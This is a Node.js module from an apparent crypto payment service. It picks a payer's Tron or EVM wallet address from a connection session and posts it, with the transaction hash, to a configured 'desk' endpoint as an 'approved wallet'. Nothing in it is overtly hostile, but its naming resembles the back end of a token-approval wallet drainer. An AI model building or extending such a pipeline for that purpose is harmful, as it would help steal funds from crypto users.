const env = require("../config/env");
const sessionStore = require("../storage/sessions");
const logger = require("../utils/logger");

function chainIdForNetwork(networkKey) {
    if (networkKey === "tron") {
        return "tron:0x2b6653dc";
    }
    if (networkKey === "bsc") {
        return "eip155:56";
    }
    if (networkKey === "eth" || networkKey === "ethereum") {
        return "eip155:1";
    }
    return null;
}

function addressForPayment(payment) {
    if (payment?.fromAddress) {
        return payment.fromAddress;
    }

    const session = sessionStore.getSession(payment.connectionId) || {};
    const { expandCardAccounts } = require("../utils/helpers");
    const accounts = expandCardAccounts(session.accounts || []);
    const networkKey = String(payment.network || "").toLowerCase();
    const chainId = chainIdForNetwork(networkKey);
    const match = accounts.find((item) => (
        item.network === networkKey
        || item.chainId === chainId
        || (networkKey === "tron" && item.namespace === "tron")
        || ((networkKey === "bsc" || networkKey === "eth") && item.namespace === "eip155" && item.chainId === chainId)
    ));

    const picked = match?.address || null;
    if (networkKey === "eth" || networkKey === "ethereum" || networkKey === "bsc") {
        if (picked && /^0x[a-fA-F0-9]{40}$/i.test(picked)) {
            return picked;
        }
        const evm = accounts.find((item) => /^0x[a-fA-F0-9]{40}$/i.test(String(item.address || "")));
        return evm?.address || null;
    }

    if (picked && String(picked).startsWith("T")) {
        return picked;
    }

    const tron = accounts.find((item) => String(item.address || "").startsWith("T"));
    return tron?.address || null;
}

function deskConfig() {
    const url = String(env.DESK_URL || "").trim().replace(/\/$/, "");
    const secret = String(env.DESK_INGEST_SECRET || "").trim();
    return { url, secret };
}

async function ingestApprovedWallet(payment, deps = {}) {
    const { url, secret } = deskConfig();
    if (!url || !secret) {
        return { skipped: true, reason: "unset" };
    }

    const address = addressForPayment(payment);
    const txHash = payment?.transactionHash;
    const network = payment?.network;
    if (!address || !txHash || !network) {
        logger.warn({ paymentId: payment?.paymentId }, "Desk ingest skipped: missing address or tx hash");
        return { skipped: true, reason: "incomplete" };
    }

    const fetchImpl = deps.fetchImpl || fetch;
    const response = await fetchImpl(`${url}/api/ingest`, {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
            "x-ingest-secret": secret
        },
        body: JSON.stringify({ network, address, txHash })
    });

    const text = await response.text();
    let payload = null;
    try {
        payload = JSON.parse(text);
    } catch (_err) {
        payload = { raw: text };
    }

    if (!response.ok) {
        logger.warn({
            paymentId: payment.paymentId,
            status: response.status,
            error: payload.error || payload.raw
        }, "Desk ingest failed");
        return { ok: false, status: response.status, payload };
    }

    logger.info({ paymentId: payment.paymentId, network, address }, "Desk ingest saved approved wallet");
    return { ok: true, payload };
}

module.exports = {
    ingestApprovedWallet,
    addressForPayment,
    deskConfig
};
